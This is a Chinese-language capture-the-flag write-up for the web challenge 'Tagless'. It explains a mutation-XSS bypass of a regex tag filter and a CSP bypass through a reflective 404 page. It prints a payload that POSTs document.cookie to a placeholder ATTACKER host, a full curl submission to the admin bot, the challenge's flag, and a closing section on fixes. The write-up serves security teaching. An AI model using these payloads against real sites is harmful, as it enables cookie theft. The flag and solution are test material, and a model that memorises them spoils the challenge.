# Tagless

## 题目简述

题目允许用户把一段文本写入 iframe，并提供管理员 bot。bot 先访问站点、写入非 HttpOnly 的 flag Cookie，再访问用户提交的 localhost URL：

```python
self.driver.get("http://127.0.0.1:5000/")
self.driver.add_cookie({
    "name": "flag",
    "value": "SEKAI{w4rmUpwItHoUtTags}",
    "httponly": False,
})
self.driver.get(url)
```

页面使用正则删除看似完整的 HTML 标签：

```javascript
function sanitizeInput(str) {
    return str
      .replace(/<.*>/igm, '')
      .replace(/<\.*>/igm, '')
      .replace(/<.*>.*<\/.*>/igm, '');
}
```

过滤后的内容先通过 `document.write` 写进 iframe。若 URL 中有 `fulldisplay`，页面还会打开同源新窗口，把 iframe DOM 序列化后的 `documentElement.innerHTML` 再写一次：

```javascript
if (fulldisplay && sanitizedInput) {
    const tab = open("/");
    tab.document.write(
        iframe.contentWindow.document.documentElement.innerHTML
    );
}
```

响应 CSP 为 `script-src 'self'`，所以普通内联 XSS 即使穿过过滤器也不能执行。

## 解题过程

### 构造不含右尖括号的标签

正则只有在匹配到 `>` 时才会删除标签，因此输入使用一个永远不显式闭合的 `<script`：

```html
<script src="a/;fetch(`https://ATTACKER/`,{method:`post`,body:`${document.cookie}`})//" <img
```

该字符串没有 `>`，三个替换规则都无法匹配。它被插入题目预先构造的 iframe 文档时，后面的 `</body>` 等模板字符参与 HTML 解析，浏览器会得到一个畸形但可序列化的 script 元素。随后 `fulldisplay` 分支读取 `documentElement.innerHTML`；浏览器输出的是规范化后的 DOM 字符串，而不是原始输入。

把这份规范化 HTML 再交给新窗口的 `document.write`，script 元素在第二次解析时成为可执行的外部脚本。这是典型的 mutation XSS：过滤器检查的是第一份字符串，真正执行的是浏览器解析、序列化并再次解析后的结果。

### 用同源 404 绕过 CSP

script 的 `src` 是相对路径：

```text
a/;fetch(`https://ATTACKER/`,{method:`post`,body:`${document.cookie}`})//
```

它会请求同一 Flask 站点，因此满足 `script-src 'self'`。目标路径不存在，而题目的 404 handler 会把请求路径直接返回：

```python
@app.errorhandler(404)
def page_not_found(error):
    path = request.path
    return f"{path} not found"
```

外部脚本收到的响应大致为：

```javascript
/a/;fetch(`https://ATTACKER/`,{
  method:`post`,
  body:`${document.cookie}`
})// not found
```

其中 `/a/` 是合法的 JavaScript 正则字面量，分号后的 `fetch` 负责外传 Cookie，末尾 `//` 把 404 handler 追加的 `not found` 注释掉。服务器也没有设置 `X-Content-Type-Options: nosniff`，Chrome 会把该同源响应作为外部 JavaScript 执行。

### 提交给 bot

将恶意 HTML 放入 `auto_input`，同时开启 `fulldisplay`。可直接使用官方 PoC 的结构：

```bash
curl 'http://TARGET/report' \
  -X POST \
  --data 'url=http://127.0.0.1:5000/?auto_input=%3Cscript%20src=%22a/;fetch(`https://ATTACKER/`,{method:`post`,body:`${document.cookie}`})//%22%20%3Cimg%26fulldisplay=1'
```

末尾必须写成 `%26fulldisplay=1`。`/report` 接收的是 `application/x-www-form-urlencoded` 表单；若直接写 `&fulldisplay=1`，它会被当成 POST 表单的第二个字段，bot 实际访问的 URL 中便没有 `fulldisplay`。编码为 `%26` 后，Flask 第一次解码表单时才把它还原成目标 URL 内部的 `&`。

bot 二次加载页面后，同源 404 脚本执行跨源 POST，请求正文即为：

```text
flag=SEKAI{w4rmUpwItHoUtTags}
```

## 方法总结

本题说明，基于正则删除 HTML 标签无法替代真正的上下文编码和 HTML sanitizer。攻击者不必提交语法完整的标签；浏览器的容错解析、DOM 序列化和二次解析可能把原本无害或不完整的字符串变成可执行节点。

CSP 确实阻止了内联脚本，但站点自己的任意同源响应也可能成为脚本来源。将未编码的路径反射进 404 页面、缺少 `nosniff`，再配合刻意构造为 JavaScript 的 URL，便把同源白名单变成了绕过手段。修复时应使用成熟的 HTML sanitizer，避免对不可信 DOM 做 `innerHTML`/`document.write` 往返，并为响应设置正确 MIME 类型与 `X-Content-Type-Options: nosniff`。
